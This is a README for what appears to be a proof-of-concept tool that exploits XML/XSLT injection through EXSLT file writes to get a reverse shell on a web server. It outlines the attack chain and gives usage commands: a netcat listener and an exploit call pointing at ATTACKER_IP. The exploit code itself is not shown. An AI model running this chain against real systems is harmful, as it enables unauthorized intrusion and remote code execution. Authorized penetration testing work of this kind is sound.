# XML/XSLT Injection Exploit – Reverse Shell Automation

## 📌 Overview

This repository contains a **proof-of-concept exploit** that demonstrates how an **XML + XSLT injection vulnerability** can be leveraged to achieve **remote code execution (RCE)** and obtain a **reverse shell** on a vulnerable web application.

The exploit abuses **EXSLT extension functions** to write a malicious Python script on the target system, which is then executed to spawn a reverse shell back to the attacker.

This project is intended for **educational, research, and authorized penetration testing purposes only**.

---

## ⚙️ How It Works

The script automates the entire exploitation chain:

1. Authenticates against the target web application
2. Generates malicious XML and XSLT payloads
3. Uploads both files to a vulnerable XML/XSLT processing endpoint
4. Extracts the generated resource URL from the server response
5. Triggers execution of the malicious XSLT
6. Obtains a reverse shell connection

The XSLT payload uses EXSLT file-write capabilities to drop a Python script on the server, which executes a reverse shell using standard socket primitives.

---

## 🚀 Features

- Automated login handling
- XML/XSLT injection exploitation
- EXSLT file-write

---


## 🧰 Requirements

- Python 3.x
- `requests` library
- Netcat / Ncat listener
- Target application with:
- XML/XSLT processing enabled
- EXSLT extensions available
- Python installed on the server

---

## ▶️ Usage

### **1️⃣ Start a Netcat listener**
```bash
nc -lvnp <PORT>
````

### **2️⃣ Run the exploit**
```
python3 exploit.py --ip <ATTACKER_IP>  --puerto <PORT> --username <USERNAME> --password <PASSWORD>
```
